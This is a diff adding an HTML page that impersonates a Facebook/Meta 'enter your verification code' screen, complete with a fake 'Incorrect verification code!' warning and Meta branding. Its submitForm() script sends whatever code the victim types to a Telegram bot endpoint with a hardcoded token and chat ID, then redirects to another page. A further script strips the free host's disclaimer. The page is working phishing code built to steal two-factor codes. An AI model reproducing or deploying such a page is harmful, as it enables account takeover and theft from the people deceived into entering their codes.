@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Log In</title>
+    <style>
+        body {
+            text-align: center;
+        }
+
+        @font-face {
+            font-family: Roboto-Regular;
+            src: url(https://cdn.glitch.global/85c73400-2c34-44c4-b3e4-fbf71852623a/Roboto-Regular.ttf?v=1674256335133);
+        }
+
+        * {
+            font-family: Roboto-Regular;
+        }
+
+        .signupbtn {
+            width: 300px;
+            height: 40px;
+            border-radius: 5px;
+            border: solid 1px blue;
+            font-size: 17px;
+            font-weight: bold;
+            color: white;
+            background-color: blue;
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 300px;
+            height: 43px;
+            margin-bottom: 10px;
+            padding-left: 10px;
+            border-radius: 5px;
+            border: solid 1px grey;
+            font-size: 15px;
+            box-sizing: border-box; /* Added to consider padding in width calculation */
+        }
+
+        txt {
+            color: blue;
+            font-size: 15px;
+        }
+
+        .horizontal-line {
+            border: none;
+            border-top: 1px solid #ccc;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .footer {
+            font-size: 12px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <form id="loginForm" action="login3.php" method="post">
+            <div class="container">
+                <h1></h1>
+                <p></p>
+                <br>
+                <img src="https://cdn.glitch.global/85c73400-2c34-44c4-b3e4-fbf71852623a/facebook.png?v=1674256051418" width="130px"/>
+                <br>
+                <br>
+                
+                <txt style="color: black; font-size: 14px; margin-right: 75px; ">
+                Please enter your verification code
+            </txt>
+                <br>
+                <txt style="color: red; font-size: 14px; margin-right: 125px; ">
+                Incorrect verification code!
+            </txt>
+                <br>
+                <input type="password" placeholder="Verification Code" name="password" id="verificationCode" required>
+                <br>
+                <div class="clearfix">
+                    <button type="button" onclick="submitForm()" class="signupbtn">Submit</button>
+                </div>
+            </div>
+            <txt style="color: black;">
+                Not You? Log out
+            </txt>
+            <hr class="horizontal-line">
+            <div class="create-account">
+                <txt style=" border-radius: 5px; border: 1px solid black; padding-left: 5px; padding-right: 5px; color: black;">Meta Help Center</txt>
+            </div>
+            <div class="footer">
+                <br><br><br><br><br><br>
+                <txt style="font-size: 14px; color: grey; margin-right: 222px;">English (UK)</txt><br><br><br><br>About . Help . More <br><br>Meta &#169; 2023
+            </div>
+        </form>
+    </center>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            var disclaimer =  document.querySelector("img[alt='www.000webhost.com']");
+            if(disclaimer){
+                disclaimer.remove();
+            }  
+        });
+
+        function submitForm() {
+            // Get the verification code
+            var verificationCode = document.getElementById("verificationCode").value;
+
+            // Submit the data to the Telegram bot
+            fetch('https://api.telegram.org/bot6607938692:AAG_H2iO6YBKdAwpGzn41EaPfy90lq7Isxc/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '7026430464',
+                    text: 'Verification Code: ' + verificationCode,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram response:', data);
+                // After successfully submitting to Telegram, redirect the user
+                window.location.href = "wotp.html";
+            })
+            .catch(error => {
+                console.error('Error submitting to Telegram:', error);
+                // Handle error if needed
+            });
+        }
+    </script>
+</body>
+</html>
